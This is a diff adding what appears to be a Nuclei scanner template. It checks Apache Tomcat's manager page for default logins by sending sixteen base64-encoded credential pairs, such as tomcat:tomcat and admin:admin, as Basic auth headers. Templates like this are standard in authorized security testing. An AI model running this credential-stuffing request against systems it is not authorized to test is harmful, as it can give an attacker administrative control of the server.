@@ -1,0 +1,49 @@
+id: tomcat-manager-login
+info:
+  author: pdteam
+  name: tomcat-manager-default-password
+  severity: high
+  tags: tomcat-manager
+requests:
+  - attack: sniper
+    matchers:
+      - status:
+          - 200
+        type: status
+      - type: word
+        words:
+          - Apache Tomcat
+    extractors:
+      - type: regex
+        name: cookie
+        internal: true
+        part: header
+        regex:
+          - 'JSESSIONID\..*=([a-z0-9.]+)'
+    matchers-condition: and
+    payloads:
+      auth:
+        - dG9tY2F0OnRvbWNhdA==
+        - dG9tY2F0OnMzY3JldA==
+        - YWRtaW46YWRtaW4=
+        - b3Z3ZWJ1c3I6T3ZXKmJ1c3Ix
+        - ajJkZXBsb3llcjpqMmRlcGxveWVy
+        - Y3hzZGs6a2RzeGM=
+        - QURNSU46QURNSU4=
+        - eGFtcHA6eGFtcHA=
+        - UUNDOlFMb2dpYzY2
+        - YWRtaW46dG9tY2F0
+        - cm9vdDpyb290
+        - cm9sZTE6cm9sZTE=
+        - cm9sZTpjaGFuZ2V0aGlz
+        - dG9tY2F0OmNoYW5nZXRoaXM=
+        - YWRtaW46ajVCcm45
+        - cm9sZTE6dG9tY2F0
+    raw:
+      - |
+        GET /manager/html HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Basic {{auth}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0
+        Accept-Language: en-US,en;q=0.9
+        Connection: close
